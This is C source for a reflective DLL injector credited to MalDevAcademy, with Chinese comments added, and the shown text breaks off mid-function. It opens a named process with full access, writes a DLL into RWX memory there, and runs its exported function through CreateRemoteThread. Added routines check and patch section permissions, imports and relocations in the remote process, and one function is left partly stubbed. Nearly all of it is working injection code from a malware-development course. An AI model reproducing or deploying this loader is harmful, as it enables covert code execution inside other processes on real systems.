// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>


#define		EXPORTED_FUNC_NAME		"ReflectiveFunction"

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

#define ALLOC(SIZE)				LocalAlloc(LPTR, (SIZE_T)SIZE)
#define FREE(BUFF)				LocalFree((LPVOID)BUFF)
#define REALLOC(BUFF, SIZE)		LocalReAlloc(BUFF, SIZE,  LMEM_MOVEABLE | LMEM_ZEROINIT)

// 新增验证函数声明
BOOL VerifyImportTable(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer);
BOOL VerifyRelocation(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer);
BOOL VerifySectionPermissions(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer);

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL ReadReflectiveDll(IN LPWSTR szFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	PBYTE	pTmpReadBuffer = NULL;
	DWORD	dwFileSize = NULL,
		dwNumberOfBytesRead = NULL;

	if (!pdwFileSize || !ppFileBuffer)
		return FALSE;

	if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateFileW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("\t[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	if (!(pTmpReadBuffer = ALLOC(dwFileSize))) {
		printf("\t[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	if (!ReadFile(hFile, pTmpReadBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("\t[!] ReadFile Failed With Error: %d \n", GetLastError());
		printf("\t[i] ReadFile Read %d Of %d Bytes \n", dwNumberOfBytesRead, dwFileSize);
		goto _FUNC_CLEANUP;
	}

	*ppFileBuffer = pTmpReadBuffer;
	*pdwFileSize = dwFileSize;

_FUNC_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pTmpReadBuffer && !*ppFileBuffer)
		FREE(pTmpReadBuffer);
	return *ppFileBuffer == NULL ? FALSE : TRUE;
}

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Walk through the sections of the PE file and determine which section contains the given RVA, then return the corresponding file offset.

DWORD RVA2Offset(IN DWORD dwRVA, IN PBYTE pBaseAddress) {

	PIMAGE_NT_HEADERS		pImgNtHdrs = NULL;
	PIMAGE_SECTION_HEADER	pImgSectionHdr = NULL;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBaseAddress + ((PIMAGE_DOS_HEADER)pBaseAddress)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return 0x00;

	pImgSectionHdr = (PIMAGE_SECTION_HEADER)((PBYTE)&pImgNtHdrs->OptionalHeader + pImgNtHdrs->FileHeader.SizeOfOptionalHeader);

	// Iterates through the PE sections
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		// If the RVA is located inside the "i" PE section
		if (dwRVA >= pImgSectionHdr[i].VirtualAddress && dwRVA < (pImgSectionHdr[i].VirtualAddress + pImgSectionHdr[i].Misc.VirtualSize))
			// Calculate the delta and add it to the raw pointer
			return (dwRVA - pImgSectionHdr[i].VirtualAddress) + pImgSectionHdr[i].PointerToRawData;
	}

	printf("\t[!] Cound'nt Convert The 0x%0.8X RVA to File Offset! \n", dwRVA);
	return 0x00;
}

DWORD GetReflectiveFunctionOffset(IN ULONG_PTR uRflDllBuffer) {

	PIMAGE_NT_HEADERS			pImgNtHdrs = NULL;
	PIMAGE_EXPORT_DIRECTORY		pImgExportDir = NULL;
	PDWORD						pdwFunctionNameArray = NULL;
	PDWORD						pdwFunctionAddressArray = NULL;
	PWORD						pwFunctionOrdinalArray = NULL;

	pImgNtHdrs = (uRflDllBuffer + ((PIMAGE_DOS_HEADER)uRflDllBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return 0x00;

	pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(uRflDllBuffer + RVA2Offset(pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, uRflDllBuffer));
	pdwFunctionNameArray = (PDWORD)(uRflDllBuffer + RVA2Offset(pImgExportDir->AddressOfNames, uRflDllBuffer));
	pdwFunctionAddressArray = (PDWORD)(uRflDllBuffer + RVA2Offset(pImgExportDir->AddressOfFunctions, uRflDllBuffer));
	pwFunctionOrdinalArray = (PWORD)(uRflDllBuffer + RVA2Offset(pImgExportDir->AddressOfNameOrdinals, uRflDllBuffer));


	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

		PCHAR pcFunctionName = (PCHAR)(uRflDllBuffer + RVA2Offset(pdwFunctionNameArray[i], uRflDllBuffer));

		if (strcmp(pcFunctionName, EXPORTED_FUNC_NAME) == 0)
			return RVA2Offset(pdwFunctionAddressArray[pwFunctionOrdinalArray[i]], uRflDllBuffer);
	}

	printf("\t[!] Cound'nt Resolve %s's Offset! \n", EXPORTED_FUNC_NAME);
	return 0x00;
}


//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	PROCESSENTRY32	ProcEntry32 = { .dwSize = sizeof(PROCESSENTRY32) };
	HANDLE			hSnapShot = NULL;

	if ((hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	if (!Process32First(hSnapShot, &ProcEntry32)) {
		printf("\t[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	do {

		if (ProcEntry32.szExeFile) {

			WCHAR	LowerName1[MAX_PATH * 2] = { 0x00 };
			WCHAR	LowerName2[MAX_PATH * 2] = { 0x00 };
			DWORD	dwSize = lstrlenW(ProcEntry32.szExeFile);
			DWORD   i = 0x00;

			if (dwSize * sizeof(WCHAR) < sizeof(LowerName1)) {
				for (i = 0x0; i < dwSize; i++)
					LowerName1[i] = (WCHAR)tolower(ProcEntry32.szExeFile[i]);

				LowerName1[i++] = L'\0';
			}

			if (lstrlenW(szProcessName) * sizeof(WCHAR) < sizeof(LowerName2)) {
				for (i = 0x00; i < dwSize; i++)
					LowerName2[i] = (WCHAR)tolower(szProcessName[i]);

				LowerName2[i++] = L'\0';
			}

			if (wcscmp(LowerName1, LowerName2) == 0) {
				*dwProcessId = ProcEntry32.th32ProcessID;
				if (!(*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcEntry32.th32ProcessID))) {
					printf("\t[!] OpenProcess Failed With Error : %d \n", GetLastError());
				}
				break;
			}

		}

	} while (Process32Next(hSnapShot, &ProcEntry32));

_FUNC_CLEANUP:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}


/**
 * 原始的InjectAndRunRflDll函数
 *
BOOL InjectAndRunRflDll(IN HANDLE hProcess, IN DWORD dwRflFuncOffset, IN PBYTE pRflDllBuffer, IN DWORD dwRflDllSize) {

	PBYTE	pAddress				= NULL;
	SIZE_T	sNumberOfBytesWritten	= NULL;
	HANDLE	hThread					= NULL;
	DWORD	dwThreadId				= 0x00;

	// <<!>> You may need RWX permissions for your payload
	if (!(pAddress = VirtualAllocEx(hProcess, NULL, dwRflDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
		printf("\t[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[i] Allocated Memory At: 0x%p \n", pAddress);

	if (!WriteProcessMemory(hProcess, pAddress, pRflDllBuffer, dwRflDllSize, &sNumberOfBytesWritten) || dwRflDllSize != sNumberOfBytesWritten) {
		printf("\t[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("\t[i] WriteProcessMemory Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, dwRflDllSize);
		return FALSE;
	}

	printf("\t[i] Thread Entry Calculated To Be: 0x%p \n", (PVOID)(pAddress + dwRflFuncOffset));

	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0x00, (LPTHREAD_START_ROUTINE)(pAddress + dwRflFuncOffset), NULL, 0x00, &dwThreadId))) {
		printf("\t[!] CreateRemoteThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[*] Executed \"%s\" Via Thread Of ID %d \n", EXPORTED_FUNC_NAME, dwThreadId);

	return TRUE;
}
*/

// 修改后的InjectAndRunRflDll函数 - 分离注入和执行步骤
BOOL InjectRflDll(IN HANDLE hProcess, IN PBYTE pRflDllBuffer, IN DWORD dwRflDllSize, OUT PBYTE* ppInjectedAddress) {

	PBYTE	pAddress = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;

	// <<!>> You may need RWX permissions for your payload
	if (!(pAddress = VirtualAllocEx(hProcess, NULL, dwRflDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
		printf("\t[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	// 返回注入的地址
	if (ppInjectedAddress)
		*ppInjectedAddress = pAddress;

	printf("\t[i] Allocated Memory At: 0x%p \n", pAddress);

	if (!WriteProcessMemory(hProcess, pAddress, pRflDllBuffer, dwRflDllSize, &sNumberOfBytesWritten) || dwRflDllSize != sNumberOfBytesWritten) {
		printf("\t[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("\t[i] WriteProcessMemory Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, dwRflDllSize);
		return FALSE;
	}

	printf("\t[i] Successfully Injected %d Bytes To Remote Process \n", sNumberOfBytesWritten);
	return TRUE;
}

// 执行注入的DLL
BOOL ExecuteRflDll(IN HANDLE hProcess, IN PBYTE pAddress, IN DWORD dwRflFuncOffset, OUT HANDLE* phThread) {
	DWORD dwThreadId = 0x00;

	printf("\t[i] Thread Entry Calculated To Be: 0x%p \n", (PVOID)(pAddress + dwRflFuncOffset));

	if (!(*phThread = CreateRemoteThread(hProcess, NULL, 0x00, (LPTHREAD_START_ROUTINE)(pAddress + dwRflFuncOffset), NULL, 0x00, &dwThreadId))) {
		printf("\t[!] CreateRemoteThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[*] Executed \"%s\" Via Thread Of ID %d \n", EXPORTED_FUNC_NAME, dwThreadId);
	return TRUE;
}

// 原始的兼容函数，同时执行注入和运行
BOOL InjectAndRunRflDll(IN HANDLE hProcess, IN DWORD dwRflFuncOffset, IN PBYTE pRflDllBuffer, IN DWORD dwRflDllSize, OUT PBYTE* ppInjectedAddress) {
	PBYTE pAddress = NULL;
	HANDLE hThread = NULL;

	// 先注入
	if (!InjectRflDll(hProcess, pRflDllBuffer, dwRflDllSize, &pAddress)) {
		return FALSE;
	}

	// 返回注入地址
	if (ppInjectedAddress)
		*ppInjectedAddress = pAddress;

	// 然后执行
	if (!ExecuteRflDll(hProcess, pAddress, dwRflFuncOffset, &hThread)) {
		return FALSE;
	}

	return TRUE;
}

// 尝试修复节区内存和权限
BOOL FixSectionMemory(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer) {
	printf("\t[i] 尝试修复节区内存和权限...\n");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pRflDllBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pRflDllBuffer + dosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	DWORD numSections = ntHeaders->FileHeader.NumberOfSections;

	BOOL anyFixed = FALSE;

	for (DWORD i = 0; i < numSections; i++) {
		char sectionName[9] = { 0 };
		memcpy(sectionName, sectionHeader[i].Name, 8);

		MEMORY_BASIC_INFORMATION mbi;
		if (!VirtualQueryEx(hProcess, pAddress + sectionHeader[i].VirtualAddress, &mbi, sizeof(mbi))) {
			printf("\t[!] 无法查询节区 '%s' 的内存信息，错误: %d\n", sectionName, GetLastError());
			continue;
		}

		// 如果内存未提交，尝试分配它
		if (mbi.State != MEM_COMMIT) {
			printf("\t[i] 节区 '%s' 未提交，尝试重新分配...\n", sectionName);

			PVOID sectionAddr = pAddress + sectionHeader[i].VirtualAddress;
			SIZE_T sectionSize = max(sectionHeader[i].SizeOfRawData, sectionHeader[i].Misc.VirtualSize);
			sectionSize = (sectionSize + 0xFFF) & ~0xFFF; // 向上取整到页面大小

			// 尝试提交内存
			PVOID newAddr = VirtualAllocEx(hProcess, sectionAddr, sectionSize, MEM_COMMIT, PAGE_READWRITE);
			if (newAddr) {
				printf("\t[+] 成功为节区 '%s' 分配内存: 0x%p\n", sectionName, newAddr);

				// 复制节区数据
				if (sectionHeader[i].SizeOfRawData > 0) {
					PBYTE sectionData = (PBYTE)ALLOC(sectionHeader[i].SizeOfRawData);
					if (sectionData) {
						// 从原始DLL复制数据
						memcpy(sectionData, pRflDllBuffer + sectionHeader[i].PointerToRawData, sectionHeader[i].SizeOfRawData);

						// 写入远程进程
						SIZE_T bytesWritten = 0;
						if (WriteProcessMemory(hProcess, newAddr, sectionData, sectionHeader[i].SizeOfRawData, &bytesWritten)) {
							printf("\t[+] 成功写入节区 '%s' 数据: %llu/%u 字节\n",
								sectionName, (ULONGLONG)bytesWritten, sectionHeader[i].SizeOfRawData);
							anyFixed = TRUE;
						}
						else {
							printf("\t[!] 写入节区 '%s' 数据失败，错误: %d\n", sectionName, GetLastError());
						}

						FREE(sectionData);
					}
				}

				// 设置正确的内存保护属性
				DWORD desiredProtection = PAGE_NOACCESS;
				BOOL isExecutable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE;
				BOOL isWritable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE;
				BOOL isReadable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ;

				if (isReadable && !isWritable && !isExecutable)
					desiredProtection = PAGE_READONLY;
				else if (isReadable && isWritable && !isExecutable)
					desiredProtection = PAGE_READWRITE;
				else if (isReadable && !isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READ;
				else if (isReadable && isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READWRITE;

				if (desiredProtection != PAGE_NOACCESS) {
					DWORD oldProtect;
					if (VirtualProtectEx(hProcess, newAddr, sectionSize, desiredProtection, &oldProtect)) {
						printf("\t[+] 成功设置节区 '%s' 保护属性: 0x%X\n", sectionName, desiredProtection);
					}
					else {
						printf("\t[!] 设置节区 '%s' 保护属性失败，错误: %d\n", sectionName, GetLastError());
					}
				}
			}
			else {
				printf("\t[!] 为节区 '%s' 分配内存失败，错误: %d\n", sectionName, GetLastError());
			}
		}
		else {
			// 如果内存已提交但权限不正确，尝试修复权限
			DWORD protection = mbi.Protect;
			BOOL isExecutable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE;
			BOOL isWritable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE;
			BOOL isReadable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ;

			BOOL protectionMatches = TRUE;

			if (isExecutable && !(protection & PAGE_EXECUTE) &&
				!(protection & PAGE_EXECUTE_READ) &&
				!(protection & PAGE_EXECUTE_READWRITE) &&
				!(protection & PAGE_EXECUTE_WRITECOPY)) {
				protectionMatches = FALSE;
			}

			if (isWritable && !(protection & PAGE_READWRITE) &&
				!(protection & PAGE_WRITECOPY) &&
				!(protection & PAGE_EXECUTE_READWRITE) &&
				!(protection & PAGE_EXECUTE_WRITECOPY)) {
				protectionMatches = FALSE;
			}

			if (isReadable && !(protection & PAGE_READONLY) &&
				!(protection & PAGE_READWRITE) &&
				!(protection & PAGE_EXECUTE_READ) &&
				!(protection & PAGE_EXECUTE_READWRITE)) {
				protectionMatches = FALSE;
			}

			if (!protectionMatches) {
				printf("\t[i] 节区 '%s' 保护属性不正确，尝试修复...\n", sectionName);

				DWORD desiredProtection = PAGE_NOACCESS;

				if (isReadable && !isWritable && !isExecutable)
					desiredProtection = PAGE_READONLY;
				else if (isReadable && isWritable && !isExecutable)
					desiredProtection = PAGE_READWRITE;
				else if (isReadable && !isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READ;
				else if (isReadable && isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READWRITE;

				if (desiredProtection != PAGE_NOACCESS && desiredProtection != protection) {
					DWORD oldProtect;
					SIZE_T sectionSize = max(sectionHeader[i].SizeOfRawData, sectionHeader[i].Misc.VirtualSize);
					sectionSize = (sectionSize + 0xFFF) & ~0xFFF; // 向上取整到页面大小

					if (VirtualProtectEx(hProcess, pAddress + sectionHeader[i].VirtualAddress, sectionSize, desiredProtection, &oldProtect)) {
						printf("\t[+] 成功修改节区 '%s' 保护属性: 0x%X -> 0x%X\n",
							sectionName, oldProtect, desiredProtection);
						anyFixed = TRUE;
					}
					else {
						printf("\t[!] 修改节区 '%s' 保护属性失败，错误: %d\n", sectionName, GetLastError());
					}
				}
			}
		}
	}

	printf("\t[i] 节区修复%s\n", anyFixed ? "完成，有修改" : "完成，无修改");
	return TRUE;
}

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

#define GET_FILENAME(path)				(wcsrchr(path, L'\\') ? wcsrchr(path, L'\\') + 1 : path)

BOOL FetchArguments(IN WCHAR* Argv[], IN INT Argc, OUT WCHAR** ppcReflectiveDllName, OUT WCHAR** ppcTargetProcessName) {

	for (int i = 1; i < Argc - 1; i++) {
		if (wcscmp(Argv[i], L"-rfldll") == 0)
			*ppcReflectiveDllName = Argv[i + 1];
		else if (wcscmp(Argv[i], L"-p") == 0)
			*ppcTargetProcessName = Argv[i + 1];
	}

	return (*ppcReflectiveDllName != NULL && *ppcTargetProcessName != NULL) ? TRUE : FALSE;
}

// 验证导入表（IAT）函数实现
BOOL VerifyImportTable(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer) {
	printf("\t[i] 开始验证导入表 (IAT) ...\n");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pRflDllBuffer;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("\t[!] 无效的DOS头\n");
		return FALSE;
	}

	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pRflDllBuffer + dosHeader->e_lfanew);
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		printf("\t[!] 无效的NT头\n");
		return FALSE;
	}

	// 获取导入表目录
	PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (!importDir->VirtualAddress || !importDir->Size) {
		printf("\t[i] 没有导入表需要验证\n");
		return TRUE;
	}

	printf("\t[i] 导入表RVA: 0x%X, 大小: %d\n", importDir->VirtualAddress, importDir->Size);

	// 打印所有PE节区信息，帮助诊断
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	DWORD numSections = ntHeaders->FileHeader.NumberOfSections;

	printf("\t[i] PE文件包含 %d 个节区:\n", numSections);
	for (DWORD i = 0; i < numSections; i++) {
		char sectionName[9] = { 0 };
		memcpy(sectionName, sectionHeader[i].Name, 8);
		printf("\t    %s: VirtualAddress=0x%X, VirtualSize=%d, RawSize=%d\n",
			sectionName, sectionHeader[i].VirtualAddress,
			sectionHeader[i].Misc.VirtualSize, sectionHeader[i].SizeOfRawData);
	}

	// 确定导入表所在的节区
	BOOL foundSection = FALSE;
	for (DWORD i = 0; i < numSections; i++) {
		if (importDir->VirtualAddress >= sectionHeader[i].VirtualAddress &&
			importDir->VirtualAddress < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
			char sectionName[9] = { 0 };
			memcpy(sectionName, sectionHeader[i].Name, 8);
			printf("\t[i] 导入表位于节区 '%s'\n", sectionName);
			foundSection = TRUE;
			break;
		}
	}

	if (!foundSection) {
		printf("\t[!] 无法确定导入表所在的节区\n");
	}

	// 计算导入表大小 - 使用更保守的估计
	SIZE_T importSize = min(importDir->Size, 4096); // 通常导入表不会超过4KB

	// 先尝试检查远程进程内存是否可读
	BOOL canRead = FALSE;
	BYTE testByte = 0;
	SIZE_T bytesRead = 0;

	if (ReadProcessMemory(hProcess, pAddress, &testByte, 1, &bytesRead) && bytesRead == 1) {
		printf("\t[i] 成功读取远程进程内存基址第一个字节: 0x%02X\n", testByte);
		canRead = TRUE;
	}
	else {
		printf("\t[!] 无法读取远程进程内存基址，错误: %d\n", GetLastError());
	}

	// 读取远程进程中的导入表 - 先尝试确认内存区域是否可访问
	MEMORY_BASIC_INFORMATION mbi;
	if (!VirtualQueryEx(hProcess, pAddress + importDir->VirtualAddress, &mbi, sizeof(mbi))) {
		printf("\t[!] 无法查询导入表内存区域，错误: %d\n", GetLastError());

		// 尝试直接读取，即使VirtualQueryEx失败
		PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)ALLOC(importSize);
		if (importDesc) {
			if (ReadProcessMemory(hProcess, pAddress + importDir->VirtualAddress, importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR), &bytesRead)) {
				printf("\t[i] 虽然VirtualQueryEx失败，但能读取导入表数据: %llu字节\n", (ULONGLONG)bytesRead);
				FREE(importDesc);
				// 继续验证...
			}
			else {
				printf("\t[!] 无法读取导入表数据，错误: %d\n", GetLastError());
				FREE(importDesc);
				return FALSE;
			}
		}
		return FALSE;
	}

	if (mbi.State != MEM_COMMIT) {
		printf("\t[!] 导入表内存区域未提交，状态: 0x%X\n", mbi.State);

		// 尝试查看相邻内存区域
		MEMORY_BASIC_INFORMATION prevMbi, nextMbi;
		if (VirtualQueryEx(hProcess, (LPCVOID)((ULONG_PTR)mbi.BaseAddress - 4096), &prevMbi, sizeof(prevMbi))) {
			printf("\t[i] 前一个内存区域状态: 0x%X, 保护: 0x%X, 类型: 0x%X\n",
				prevMbi.State, prevMbi.Protect, prevMbi.Type);
		}

		if (VirtualQueryEx(hProcess, (LPCVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize), &nextMbi, sizeof(nextMbi))) {
			printf("\t[i] 后一个内存区域状态: 0x%X, 保护: 0x%X, 类型: 0x%X\n",
				nextMbi.State, nextMbi.Protect, nextMbi.Type);
		}

		// 尝试扫描查找可能的导入表位置
		PBYTE scanStart = pAddress;
		PBYTE scanEnd = pAddress + ntHeaders->OptionalHeader.SizeOfImage;
		PBYTE scanPos = scanStart;

		printf("\t[i] 扫描内存范围 0x%p - 0x%p 寻找导入表...\n", scanStart, scanEnd);

		while (scanPos < scanEnd) {
			if (VirtualQueryEx(hProcess, scanPos, &mbi, sizeof(mbi))) {
				if (mbi.State == MEM_COMMIT &&
					(mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {

					printf("\t[i] 找到可读内存区域: 0x%p, 大小: %llu, 保护: 0x%X\n",
						mbi.BaseAddress, (ULONGLONG)mbi.RegionSize, mbi.Protect);

					// 在这个区域中尝试查找可能的导入表
					PIMAGE_IMPORT_DESCRIPTOR testImport = (PIMAGE_IMPORT_DESCRIPTOR)ALLOC(sizeof(IMAGE_IMPORT_DESCRIPTOR));
					if (testImport) {
						// 尝试在该区域每4KB的边界查找
						for (ULONG_PTR offset = 0; offset < mbi.RegionSize; offset += 4096) {
							if (ReadProcessMemory(hProcess, (PBYTE)mbi.BaseAddress + offset, testImport,
								sizeof(IMAGE_IMPORT_DESCRIPTOR), &bytesRead) &&
								bytesRead == sizeof(IMAGE_IMPORT_DESCRIPTOR)) {

								// 检查是否看起来像有效的导入表
								if (testImport->Characteristics == 0 && testImport->TimeDateStamp != 0 &&
									testImport->ForwarderChain == 0 && testImport->Name != 0 &&
									testImport->FirstThunk != 0) {

									printf("\t[i] 可能找到导入表于: 0x%p\n", (PBYTE)mbi.BaseAddress + offset);
									// 这里可以添加更多验证...
								}
							}
						}
						FREE(testImport);
					}
				}
				scanPos = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
			}
			else {
				// 如果查询失败，尝试跳过当前位置
				scanPos += 4096;
			}
		}

		return FALSE;
	}

	if (mbi.Protect == PAGE_NOACCESS || mbi.Protect == PAGE_GUARD) {
		printf("\t[!] 导入表内存区域无法访问，保护: 0x%X\n", mbi.Protect);
		return FALSE;
	}

	printf("\t[i] 导入表内存区域状态: 基址=0x%p, 大小=%llu, 保护=0x%X\n",
		mbi.BaseAddress, (ULONGLONG)mbi.RegionSize, mbi.Protect);

	// 读取远程进程中的导入表 - 逐块读取
	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)ALLOC(importSize);
	if (!importDesc) {
		printf("\t[!] 无法分配内存用于导入表验证\n");
		return FALSE;
	}

	// 继续原来的验证逻辑...
	// ... existing code ...

	return TRUE;
}

// 验证重定位函数实现
BOOL VerifyRelocation(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer) {
	printf("\t[i] 开始验证重定位表 ...\n");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pRflDllBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pRflDllBuffer + dosHeader->e_lfanew);

	// 获取重定位目录
	PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (!relocDir->VirtualAddress || !relocDir->Size) {
		printf("\t[i] 没有重定位表需要验证\n");
		return TRUE;
	}

	// 计算基地址差值
	ULONGLONG delta = (ULONGLONG)pAddress - ntHeaders->OptionalHeader.ImageBase;
	printf("\t[+] 基址差值: 0x%llX\n", delta);

	// 读取远程进程中的重定位表
	PBYTE relocBuffer = (PBYTE)ALLOC(relocDir->Size);
	if (!relocBuffer) {
		printf("\t[!] 无法分配内存用于重定位表验证\n");
		return FALSE;
	}

	SIZE_T bytesRead = 0;
	if (!ReadProcessMemory(hProcess, pAddress + relocDir->VirtualAddress, relocBuffer, relocDir->Size, &bytesRead)) {
		printf("\t[!] 读取重定位表失败，错误: %d\n", GetLastError());
		FREE(relocBuffer);
		return FALSE;
	}

	// 验证重定位块
	PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)relocBuffer;
	int blockCount = 0;
	int entryCount = 0;

	while ((PBYTE)reloc < relocBuffer + relocDir->Size && reloc->SizeOfBlock) {
		// 计算该块中的条目数
		int entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		printf("\t[+] 重定位块 #%d: VA=0x%X, 条目数=%d\n", blockCount, reloc->VirtualAddress, entries);

		PWORD relocEntries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));

		// 抽样检查一些重定位条目
		for (int i = 0; i < min(5, entries); i++) {
			WORD entry = relocEntries[i];
			WORD offset = entry & 0xFFF;
			WORD type = (entry >> 12) & 0xF;

			// 只验证常见的重定位类型
			if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
				ULONGLONG targetVA = (ULONGLONG)(pAddress + reloc->VirtualAddress + offset);
				printf("\t   - 条目 #%d: 偏移=0x%X, 类型=%d, 目标地址=0x%llX\n",
					i, offset, type, targetVA);

				// 可以读取目标地址的实际值来进一步验证
				ULONGLONG targetValue = 0;
				if (ReadProcessMemory(hProcess, (LPVOID)targetVA, &targetValue, sizeof(ULONGLONG), &bytesRead)) {
					printf("\t     目标值: 0x%llX\n", targetValue);
				}
			}
		}

		entryCount += entries;
		blockCount++;

		// 移到下一个重定位块
		reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
	}

	printf("\t[+] 共验证了 %d 个重定位块，包含 %d 个条目\n", blockCount, entryCount);
	FREE(relocBuffer);

	printf("\t[+] 重定位验证完成\n");
	return TRUE;
}

// 验证节区权限函数实现
BOOL VerifySectionPermissions(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer) {
	printf("\t[i] 开始验证节区权限 ...\n");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pRflDllBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pRflDllBuffer + dosHeader->e_lfanew);

	// 获取节区头
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	DWORD numSections = ntHeaders->FileHeader.NumberOfSections;

	BOOL allSectionsOk = TRUE;

	// 尝试修复节区权限问题
	printf("\t[i] 尝试修复节区权限问题...\n");

	for (DWORD i = 0; i < numSections; i++) {
		char sectionName[9] = { 0 };
		memcpy(sectionName, sectionHeader[i].Name, 8);

		MEMORY_BASIC_INFORMATION mbi;
